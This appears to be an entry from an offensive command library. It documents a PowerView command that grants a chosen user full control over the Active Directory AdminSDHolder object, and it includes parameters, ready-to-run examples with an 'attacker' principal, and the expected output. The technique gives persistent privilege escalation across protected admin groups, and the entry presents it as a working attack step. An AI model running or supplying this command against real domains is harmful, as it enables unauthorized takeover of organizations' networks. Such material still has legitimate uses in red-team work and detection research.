---
id: 3d897546-0ba0-4b07-b2c4-121a605346d0
type: command
executor: powershell
data: >-
  Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=$_DOMAIN'
  -PrincipalIdentity $_USERNAME -Rights All -Verbose
output: null
created_at: '2023-04-06T03:56:06.430321+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - acl-modification
  - adminsdholder
verified: true
validated: true
---

# add-full-control-acl-to-adminsdholder

## Command

```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=$_DOMAIN" -PrincipalIdentity $_USERNAME -Rights All -Verbose
```

## Description

Adds a full control ACL entry for a specified user on the AdminSDHolder object using PowerView module. This is key for propagating privileges to protected AD groups.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -TargetIdentity | Distinguished name of AdminSDHolder object, with domain placeholder | Yes |
| -PrincipalIdentity | SAM account name of the user gaining rights | Yes |
| -Rights | Rights to grant (All for full control) | Yes |
| -Verbose | Provides detailed output on execution | No |

## Examples

### Basic Usage

```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All -Verbose
```

### Advanced Usage

```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=example,DC=com" -PrincipalIdentity controlleduser -Rights All
```

## Expected Output

Verbose output: "Added ACE for principal 'attacker' with rights 'All' on target 'CN=AdminSDHolder...'". No errors indicate success.

## Related

- [[procedures/Abuse-AdminSDHolder-for-Privilege-Escalation]]
- [[commands/grant-all-rights-to-adminsdholder]]
